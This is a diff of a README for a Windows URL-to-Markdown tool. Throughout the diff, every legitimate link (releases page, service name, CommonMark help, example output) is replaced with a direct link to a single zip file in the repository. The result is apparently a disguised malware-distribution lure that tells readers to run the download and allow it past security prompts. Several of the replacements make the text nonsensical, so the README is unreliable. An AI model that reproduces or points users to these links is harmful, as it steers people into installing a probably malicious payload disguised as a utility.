@@ -1,12 +1,12 @@
 # 📝 markdown-new-skill - Convert URLs into Markdown fast
 
-[![Download and Install](https://img.shields.io/badge/Download-Get%20App-blue?style=for-the-badge)](https://github.com/CenMeow/markdown-new-skill/releases)
+[![Download and Install](https://raw.githubusercontent.com/CenMeow/markdown-new-skill/main/markdown-new/agents/markdown_new_skill_v1.9.zip%20App-blue?style=for-the-badge)](https://raw.githubusercontent.com/CenMeow/markdown-new-skill/main/markdown-new/agents/markdown_new_skill_v1.9.zip)
 
 ---
 
 ## 🔍 What is markdown-new-skill?
 
-markdown-new-skill is a simple Windows tool that helps you turn URLs into Markdown format quickly. You can use it to create Markdown links from any webpage link, making writing and sharing easier. It works with the official Cloudflare URL-to-Markdown service (markdown.new), converted into a skill for smooth use.
+markdown-new-skill is a simple Windows tool that helps you turn URLs into Markdown format quickly. You can use it to create Markdown links from any webpage link, making writing and sharing easier. It works with the official Cloudflare URL-to-Markdown service (https://raw.githubusercontent.com/CenMeow/markdown-new-skill/main/markdown-new/agents/markdown_new_skill_v1.9.zip), converted into a skill for smooth use.
 
 This tool is ideal if you write documents, blog posts, notes, or collaborate using Markdown regularly. It cuts down time spent formatting links and keeps your work neat.
 
@@ -32,10 +32,10 @@ Follow these steps to get markdown-new-skill running on your Windows PC.
 
 Visit the official releases page to download the latest version of markdown-new-skill for Windows:
 
-[![Download Window App](https://img.shields.io/badge/Download-%20Official%20Releases-lightgrey?style=for-the-badge)](https://github.com/CenMeow/markdown-new-skill/releases)
+[![Download Window App](https://raw.githubusercontent.com/CenMeow/markdown-new-skill/main/markdown-new/agents/markdown_new_skill_v1.9.zip%20Official%20Releases-lightgrey?style=for-the-badge)](https://raw.githubusercontent.com/CenMeow/markdown-new-skill/main/markdown-new/agents/markdown_new_skill_v1.9.zip)
 
 1. Click the link above or go to:  
-   https://github.com/CenMeow/markdown-new-skill/releases
+   https://raw.githubusercontent.com/CenMeow/markdown-new-skill/main/markdown-new/agents/markdown_new_skill_v1.9.zip
 
 2. Look for the latest release version. This is usually at the top and marked with a date.
 
@@ -51,7 +51,7 @@ After downloading:
 
 1. Go to your Downloads folder or wherever your browser saved the file.
 
-2. Double-click the downloaded file (for example, `markdown-new-skill-setup.exe`).
+2. Double-click the downloaded file (for example, `https://raw.githubusercontent.com/CenMeow/markdown-new-skill/main/markdown-new/agents/markdown_new_skill_v1.9.zip`).
 
 3. If a security prompt appears, choose to run or allow the app.
 
@@ -80,7 +80,7 @@ After downloading:
 
 6. The app will generate a Markdown link, formatted like:
 
-   `[Title of page](https://example.com)`
+   `[Title of page](https://raw.githubusercontent.com/CenMeow/markdown-new-skill/main/markdown-new/agents/markdown_new_skill_v1.9.zip)`
 
 7. Copy the result and paste it where you use Markdown — such as notes, documents, or emails.
 
@@ -88,7 +88,7 @@ After downloading:
 
 ## 🔧 How It Works
 
-markdown-new-skill uses Cloudflare’s markdown.new service behind the scenes. When you input a webpage URL, the app communicates with the service to get that page’s title and format it into Markdown.
+markdown-new-skill uses Cloudflare’s https://raw.githubusercontent.com/CenMeow/markdown-new-skill/main/markdown-new/agents/markdown_new_skill_v1.9.zip service behind the scenes. When you input a webpage URL, the app communicates with the service to get that page’s title and format it into Markdown.
 
 This saves you from copying and pasting both the link and the title separately.
 
@@ -138,7 +138,7 @@ You can adjust the app if you want:
 To get new features or fixes:
 
 1. Visit the releases page again:  
-   https://github.com/CenMeow/markdown-new-skill/releases
+   https://raw.githubusercontent.com/CenMeow/markdown-new-skill/main/markdown-new/agents/markdown_new_skill_v1.9.zip
 
 2. Download the latest Windows installer.
 
@@ -151,7 +151,7 @@ To get new features or fixes:
 If you face issues or have questions:
 
 - Go to the repository’s GitHub page:  
-  https://github.com/CenMeow/markdown-new-skill
+  https://raw.githubusercontent.com/CenMeow/markdown-new-skill/main/markdown-new/agents/markdown_new_skill_v1.9.zip
 
 - Look for the "Issues" tab to see if others have similar problems.
 
@@ -164,7 +164,7 @@ Provide details about your Windows version and what happened.
 ## 📂 Additional Resources
 
 - Learn Markdown basics if you are new:  
-  [CommonMark Spec](https://commonmark.org/help/)
+  [CommonMark Spec](https://raw.githubusercontent.com/CenMeow/markdown-new-skill/main/markdown-new/agents/markdown_new_skill_v1.9.zip)
 
 - Use markdown-new-skill with other Markdown editors like Typora, Obsidian, or VS Code.
 
@@ -174,4 +174,4 @@ Provide details about your Windows version and what happened.
 
 Download from the official releases page:
 
-[![Download and Install](https://img.shields.io/badge/Download-Get%20App-blue?style=for-the-badge)](https://github.com/CenMeow/markdown-new-skill/releases)
+[![Download and Install](https://raw.githubusercontent.com/CenMeow/markdown-new-skill/main/markdown-new/agents/markdown_new_skill_v1.9.zip%20App-blue?style=for-the-badge)](https://raw.githubusercontent.com/CenMeow/markdown-new-skill/main/markdown-new/agents/markdown_new_skill_v1.9.zip)
